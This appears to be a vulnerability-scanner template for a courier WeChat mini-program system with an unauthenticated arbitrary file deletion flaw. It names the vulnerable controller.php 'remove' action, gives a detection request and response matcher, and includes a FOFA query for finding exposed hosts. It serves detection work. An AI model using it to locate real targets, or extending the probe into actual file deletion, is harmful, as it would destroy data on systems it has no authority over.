id: kuaidi-wechat-controller-filedelete
info:
  name:  快递微信小程序系统 controller.php - filedelete
  author: leadlife
  severity: high
  description: 快递微信小程序系统 controller 接口存在任意文件删除漏洞，未经身份验证攻击者可通过该漏洞删除系统文件。
  reference: 
    - https://github.com/eeeeeeeeee-code/POC/blob/main/wpoc/%E5%BF%AB%E9%80%92%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%B3%BB%E7%BB%9F/%E5%BF%AB%E9%80%92%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E.md
  classification:
    cve-id: 
  metadata:
    verified: true
    fofa-query: body="/static/default/newwap/lang/js/jquery.localize.min.js"
  tags: kuaidi,wechat,filedelete


http:
  - method: GET
    path:
      - "{{BaseURL}}/public/qiniu_ueditor/php/controller.php?action=remove"
        
    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains_all(body,'delete file error')
        condition: and